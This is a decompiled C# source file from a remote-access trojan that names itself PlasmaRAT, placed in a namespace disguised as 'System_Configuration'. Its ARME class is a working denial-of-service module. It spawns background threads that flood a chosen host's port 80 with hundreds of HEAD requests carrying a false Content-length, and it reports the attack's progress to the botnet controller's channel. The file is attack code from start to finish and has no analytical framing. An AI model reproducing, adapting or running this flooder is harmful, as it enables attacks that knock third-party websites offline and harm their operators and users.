using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x02000005 RID: 5
	[StandardModule]
	public sealed class ARME
	{
		// Token: 0x0600000A RID: 10 RVA: 0x00002B38 File Offset: 0x00000D38
		public static void StartARME(string Host, int Threadsto, int Time, string data)
		{
			if (!ARME.AttackRunning)
			{
				ARME.AttackRunning = true;
				ARME.HostToAttack = Host;
				ARME.PostDATA = data;
				ARME.ThreadstoUse = Threadsto;
				ARME.TimetoAttack = Time;
				if (ARME.HostToAttack.Contains("http://"))
				{
					ARME.HostToAttack = ARME.HostToAttack.Replace("http://", string.Empty);
				}
				if (ARME.HostToAttack.Contains("www."))
				{
					ARME.HostToAttack = ARME.HostToAttack.Replace("www.", string.Empty);
				}
				if (ARME.HostToAttack.Contains("/"))
				{
					ARME.HostToAttack = ARME.HostToAttack.Replace("/", string.Empty);
				}
				ARME.Threads = new Thread[Threadsto - 1 + 1];
				PlasmaRAT.TalktoChannel("ARME Attack on " + ARME.HostToAttack + " started!", "");
				int num = 0;
				int num2 = Threadsto - 1;
				for (int i = num; i <= num2; i++)
				{
					ARME.Threads[i] = new Thread(new ThreadStart(ARME.DoWork));
					ARME.Threads[i].IsBackground = true;
					ARME.Threads[i].Start();
				}
			}
			else
			{
				PlasmaRAT.TalktoChannel("An ARME Attack is Already Running on " + ARME.HostToAttack, "");
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002C80 File Offset: 0x00000E80
		private static void lol()
		{
			ARME.ThreadsEnded = Operators.AddObject(ARME.ThreadsEnded, 1);
			if (Operators.ConditionalCompareObjectEqual(ARME.ThreadsEnded, ARME.ThreadstoUse, false))
			{
				ARME.ThreadsEnded = 0;
				ARME.ThreadstoUse = 0;
				ARME.AttackRunning = false;
				PlasmaRAT.TalktoChannel("ARME Attack on " + ARME.HostToAttack + " finished successfully. Attacks Sent: " + ARME.Attacks.ToString(), "");
				ARME.Attacks = 0;
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002D00 File Offset: 0x00000F00
		public static void StopARME()
		{
			if (ARME.AttackRunning)
			{
				int num = 0;
				int num2 = ARME.ThreadstoUse - 1;
				for (int i = num; i <= num2; i++)
				{
					try
					{
						ARME.Threads[i].Abort();
					}
					catch (Exception ex)
					{
					}
				}
				ARME.AttackRunning = false;
				PlasmaRAT.TalktoChannel("ARME Attack on " + ARME.HostToAttack + " aborted successfully. Attacks Sent: " + ARME.Attacks.ToString(), "");
				ARME.Attacks = 0;
			}
			else
			{
				PlasmaRAT.TalktoChannel("ARME Attack:, ", "Not Running!");
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002D9C File Offset: 0x00000F9C
		private static void DoWork()
		{
			try
			{
				Socket[] array = new Socket[100];
				TimeSpan t = TimeSpan.FromSeconds((double)ARME.TimetoAttack);
				Stopwatch stopwatch = Stopwatch.StartNew();
				while (stopwatch.Elapsed < t)
				{
					try
					{
						new WebClient();
						int num = 0;
						do
						{
							array[num] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							array[num].Connect(Dns.GetHostAddresses(ARME.HostToAttack), 80);
							array[num].Send(Encoding.Default.GetBytes("HEAD / HTTP/1.1\r\nHost: " + ARME.HostToAttack.ToString() + "\r\nContent-length: 5235\r\n\r\n"));
							ARME.Attacks++;
							num++;
						}
						while (num <= 99);
						int num2 = 0;
						do
						{
							array[num2].Close();
							num2++;
						}
						while (num2 <= 99);
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
			ARME.lol();
		}

		// Token: 0x04000006 RID: 6
		private static object ThreadsEnded = 0;

		// Token: 0x04000007 RID: 7
		private static string PostDATA;

		// Token: 0x04000008 RID: 8
		private static string HostToAttack;

		// Token: 0x04000009 RID: 9
		private static int TimetoAttack;

		// Token: 0x0400000A RID: 10
		private static int ThreadstoUse;

		// Token: 0x0400000B RID: 11
		private static Thread[] Threads;

		// Token: 0x0400000C RID: 12
		private static bool AttackRunning = false;

		// Token: 0x0400000D RID: 13
		private static int Attacks = 0;
	}
}
